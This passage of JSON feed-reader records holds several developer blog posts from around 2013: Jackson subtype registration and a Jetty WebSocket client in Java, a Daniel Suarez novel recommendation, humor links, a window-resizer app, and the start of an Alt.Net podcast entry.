12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #006080\">\"body\"</span>:{</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">  <span style=\"color: #006080\">\"bodyType\"</span>:<span style=\"color: #006080\">\"BeginBattleRequest\"</span>,</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">  <span style=\"color: #006080\">\"opponentName\"</span>:<span style=\"color: #006080\">\"thatGuyOverThere\"</span></pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">  }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></div></div><p>This works really well, especially if the list of types you’re going to serialize into “body” is manageable and short, and also is known up front at compile time.</p><h4>Discovering Types</h4><p>But what if your types aren’t known up front, or you have hundreds of these body classes (and are adding more all the time), as is the real-world implementation of this case?</p><p>Instead, we can define the ObjectMapper sub types programmatically, using Reflection to identify our body candidate classes.  I prefer to use an annotation to denote the classes of interest, but you have each of the body classes implement an interface or extend from some body base class, whatever is most suitable for your situation.</p><div style=\"border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px\" id=\"codeSnippetWrapper\"><div style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">@MessageBody</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">class</span> BeginBattleResponse {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">boolean</span> successful;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> Result result;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">enum</span> Result {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        OK,</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        INVALID_REQUEST</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        <span style=\"color: #008000\">// etc, etc etc...</span></pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></div></div><p>Then registering these @MessageBody classes with the ObjectMapper is simple:</p><div style=\"border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px\" id=\"codeSnippetWrapper\"><div style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">objectMapper = <span style=\"color: #0000ff\">new</span> ObjectMapper(<span style=\"color: #0000ff\">new</span> JsonFactory());</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">objectMapper.disableDefaultTyping();</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">objectMapper.disable(SerializationFeature.WRITE_NULL_MAP_VALUES);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">objectMapper.disable(SerializationFeature.WRITE_EMPTY_JSON_ARRAYS);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #008000\">// register our @MessageBody classes with the objectMapper:</span></pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #0000ff\">for</span>(Class&lt;?&gt; clazz : reflections.getTypesAnnotatedWith(MessageBody.<span style=\"color: #0000ff\">class</span>)) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    objectMapper.registerSubtypes(clazz);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></div></div><h4>The Code</h4><p>The full implementation of this is at <a href=\"https://github.com/trasa/WebSocketClientServer/\">https://github.com/trasa/WebSocketClientServer/</a></p>","author":"Tony Rasa","_id":{"$wrap":"$oid","v":956}}
{"k":"0000000082","o":"0000002378","v":"001"}
{"_id":957,"_uid":957,"_dt":1373730296041,"_s":"b8664ca76eea86916af4ba90e4477916"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/05/17/author-report-daniel-suarez/?utm_source=rss&utm_medium=rss&utm_campaign=author-report-daniel-suarez","title":"Author Report: Daniel Suarez","published":{"$wrap":"$date","v":1368845744000,"h":"2013-05-18T02:55:44.000Z"},"starred":false,"read":false,"content":"<p>I stumbled across the novels of <a href=\"http://www.amazon.com/wiki/Daniel_Suarez/ref=ntt_at_bio_wiki\">Daniel Suarez</a> a few weeks ago via an impulse spend of an Audible credit. I am now well into his latest novel and am looking forward to whatever he’s working on now.</p><p><a href=\"http://www.amazon.com/Daemon-Daniel-Suarez/dp/0451228731/ref=wp_h_bl\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 5px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" align=\"left\" src=\"http://elegantcode.com/wp-content/uploads/2013/05/image.png\" width=\"138\" height=\"240\" /></a></p><p>His first two novels are a two-part story: <a href=\"http://www.amazon.com/wiki/Daemon_(technothriller_series)/ref=wp_la_11\">Daemon</a>, and <a href=\"http://www.amazon.com/wiki/Daemon_(technothriller_series)/ref=wp_la_13\">Freedom™</a>. I have totally dug them, especially the 7 layers of metaphor and earnest mods to plausibility. </p><p>game-theory techno-thriller cyber-punk IT rouge-developer near-sourcing commando near-dystopia AI assassin spy epic cyborg spies viruses the-good–clichés game-design mad-scientist long-running-workflow <img src='http://elegantcode.com/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' />  anti-consumerism </p><p>The most interesting thing is Daniel Suarez himself. According to his website he’s a specialist consultant-developer slinging for bounty living in southern California. His bio reads as many of ours do at some point at some point. In short this dude seems to just be one of us geeks who also writes a bang-up novel.</p><p>I have no doubt I am late to the game on this writer, but I’m old. I’ve only just gotten around to a lot of things. If you haven’t read it yet, I recommend starting with Daemon. It’s fun and enjoyably thoughtful. </p>","author":"David Starr","_id":{"$wrap":"$oid","v":957}}
{"k":"0000000082","o":"0000001404","v":"001"}
{"_id":958,"_uid":958,"_dt":1373730296041,"_s":"57d96aacfa08ec74c2e94abe4633acdb"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/05/09/developer-humor/?utm_source=rss&utm_medium=rss&utm_campaign=developer-humor","title":"Developer humor","published":{"$wrap":"$date","v":1368121393000,"h":"2013-05-09T17:43:13.000Z"},"starred":false,"read":false,"content":"<p>I literally cried this morning as I scanned these posts.</p><blockquote><p>Note: Don’t have a drink in hand or mouth when reading these.</p></blockquote><p>Enjoy:</p><ul><li><a title=\"http://martinvalasek.com/blog/pictures-from-a-developers-life\" href=\"http://martinvalasek.com/blog/pictures-from-a-developers-life\">http://martinvalasek.com/blog/pictures-from-a-developers-life</a></li><li><a title=\"http://martinvalasek.com/blog/pictures-from-a-developers-life-part-2\" href=\"http://martinvalasek.com/blog/pictures-from-a-developers-life-part-2\">http://martinvalasek.com/blog/pictures-from-a-developers-life-part-2</a></li><li><a title=\"http://martinvalasek.com/blog/pictures-from-a-developers-life-part-3\" href=\"http://martinvalasek.com/blog/pictures-from-a-developers-life-part-3\">http://martinvalasek.com/blog/pictures-from-a-developers-life-part-3</a></li></ul><p>If you’re a git user.</p><ul><li><a title=\"http://wheningit.tumblr.com/\" href=\"http://wheningit.tumblr.com/\">http://wheningit.tumblr.com/</a></li></ul>","author":"Jason Jarrett","_id":{"$wrap":"$oid","v":958}}
{"k":"0000000082","o":"0000013520","v":"001"}
{"_id":959,"_uid":959,"_dt":1373730296042,"_s":"84333e8b4b2be702fa52d03d3e4e41ec"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/05/03/server-websocket-clients-with-jetty/?utm_source=rss&utm_medium=rss&utm_campaign=server-websocket-clients-with-jetty","title":"Server WebSocket Clients, with Jetty","published":{"$wrap":"$date","v":1367621764000,"h":"2013-05-03T22:56:04.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://elegantcode.com/2013/04/29/server-websocket-clients/\" target=\"_blank\">Previously</a> I discussed how to write a Server which uses a persistent WebSocket Client, using the Netty framework to make things go.  Netty is configured through establishing a Channel Pipeline, which is great if you need a very flexible system for handling network input and output.  For most projects however, this sort of power can be overkill.</p><h4>Jetty</h4><p>Jetty, among other great things, contains a <a href=\"http://download.eclipse.org/jetty/stable-7/apidocs/org/eclipse/jetty/websocket/WebSocketClient.html\" target=\"_blank\">WebSocketClient</a> implementation.  Getting this up and running is very simple: you’ll need a WebSocketClientFactory, where you can configure various settings, and a WebSocketClient which also has a bunch of settings to flip around to meet your needs.  Once you have those, you’ll need a class that implements <a href=\"http://download.eclipse.org/jetty/stable-7/apidocs/org/eclipse/jetty/websocket/WebSocket.OnTextMessage.html\" target=\"_blank\">WebSocket.OnTextMessage</a> …and you’re pretty much done at this point.  </p><p>The code for sending and receiving messages becomes equally simple:</p><div style=\"border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px\" id=\"codeSnippetWrapper\"><div style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\" id=\"codeSnippet\"><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">@Override</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">void</span> send(Message message) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #008000\">// a message is going out!</span></pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    String data = null;</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">try</span> {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        data = messageToString(message);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        connection.sendMessage(data);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    } <span style=\"color: #0000ff\">catch</span> (Exception e) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        logger.error(<span style=\"color: #006080\">\"Failed to send message! \"</span> + data, e);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"> </pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">@Override</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\"><span style=\"color: #0000ff\">public</span> <span style=\"color: #0000ff\">void</span> onMessage(String data) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #008000\">// a message is coming in!</span></pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    logger.debug(<span style=\"color: #006080\">\"message received: {}\"</span>, data);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    <span style=\"color: #0000ff\">try</span> {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        Message message = stringToMessage(data);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        handleMessage(message);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    } <span style=\"color: #0000ff\">catch</span> (IOException e) {</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">        logger.error(<span style=\"color: #006080\">\"Failed to parse incoming message! \"</span> + data, e);</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: #f4f4f4; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">    }</pre><p><!--CRLF--></p><pre style=\"border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; background-color: white; margin: 0em; border-left-style: none; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; border-right-style: none; font-size: 8pt; overflow: visible; padding-top: 0px\">}</pre><p><!--CRLF--></div></div><p> </p><p>The complete code for this example can be found at</p><p><a href=\"https://github.com/trasa/WebSocketClientServer/tree/jettyclient\">https://github.com/trasa/WebSocketClientServer/tree/jettyclient</a></p>","author":"Tony Rasa","_id":{"$wrap":"$oid","v":959}}
{"k":"0000000082","o":"0000001337","v":"001"}
{"_id":960,"_uid":960,"_dt":1373730296043,"_s":"bbff78fdf0dafbf189523a7c87a78b21"}
{"subscription":{"$wrap":"$oid","v":21},"link":"http://elegantcode.com/2013/05/06/brians-resizer-app/?utm_source=rss&utm_medium=rss&utm_campaign=brians-resizer-app","title":"Brian’s Resizer App","published":{"$wrap":"$date","v":1367904932000,"h":"2013-05-07T05:35:32.000Z"},"starred":false,"read":false,"content":"<p>Today I was pleased to learn <a href=\"http://www.brianapps.net/sizer/\">Brian’s Sizer App</a> is still out there and still works, even with Windows 8. Just install it and right-click to snap a window to a specific size. This tool was indispensible to me when deving for web and I find myself needing it again these days in building mockups.</p><p><img style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; padding-right: 0px\" border=\"0\" alt=\"Sizer Popup Menu\" src=\"http://www.brianapps.net/sizerpopupmenu.png\" /></p><p>I am going to send email in hopes of encouraging some new feature development <img class=\"wlEmoticon wlEmoticon-smile\" style=\"border-top-style: none; border-left-style: none; border-bottom-style: none; border-right-style: none\" alt=\"Smile\" src=\"http://elegantcode.com/files/images/posts/34f23e584b4c_1371F/wlEmoticon-smile.png\" />. </p>","author":"David Starr","_id":{"$wrap":"$oid","v":960}}
{"k":"0000000082","o":"0000002561","v":"001"}
{"_id":961,"_uid":961,"_dt":1373740492902,"_s":"8815b84918da7367ae337ccc0d02f022"}
{"subscription":{"$wrap":"$oid","v":3},"link":"http://feedproxy.google.com/~r/altnetpodcast/~3/I4VXHI5-6Mg/","title":"18: Talking with Jeremy Miller about Alt.Net","published":{"$wrap":"$date","v":1239043980000,"h":"2009-04-06T18:53:00.000Z"},"starred":false,"read":false,"content":"<p>As a follow up to the last podcast that featured Mike Moore and Scott Bellware discussing Alt.Net I spoke with Jeremy Miller to put out a vision for what he feels Alt.Net should represent and how it can be a positive thing in the community. This will be the last episode here on this topic, I promise to get back to normal technology discussions (next episode is about BDD and TDD).</p><p>We talk about the following things:<br/><ul><li><a href=\"http://www.kyte.tv/shanselman#uri=channels/240253/361169\">\"Why So Mean?\" from Alt.Net Seattle</a>recorded by<a href=\"http://www.hanselman.com/blog\">Scott Hanselman</a></li><li><a href=\"http://odetocode.com/Blogs/scott/archive/2009/03/16/12651.aspx\">Aluminum Wiring in Your Software</a></li><li><a href=\"\">The Vote of No Confidence in the Entity Framework</a></li><li><a href=\"http://www.summerofnhibernate.com/\">Summer of NHibernate</a></li><li><a 